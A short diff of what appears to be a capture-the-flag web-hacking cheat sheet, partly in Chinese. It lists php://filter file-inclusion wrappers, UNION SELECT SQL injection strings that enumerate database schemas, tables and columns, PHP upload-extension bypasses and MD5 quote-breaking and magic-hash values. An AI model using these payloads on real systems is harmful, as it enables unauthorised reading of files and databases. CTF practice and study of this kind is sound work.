@@ -4,6 +4,7 @@ php://filter/convert.base64-encode/resource=
 php://filter/read=convert.base64-encode/resource=
 handler
 var_dump()
+file_get_contents
 union select 1,2, group_concat(schema_name) from information_schema.schemata #
 admin'union select 1,2, group_concat(table_name) from information_schema.tables where table_schema=database()  #
 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='***'#
@@ -41,6 +42,7 @@ php/php3/php4/php5/phtml/pht
 md5破坏引号 ffifdyop
 md5 0x   QNKCDZO s878926199a
 
+变量覆盖漏洞
 
 
 JAVA
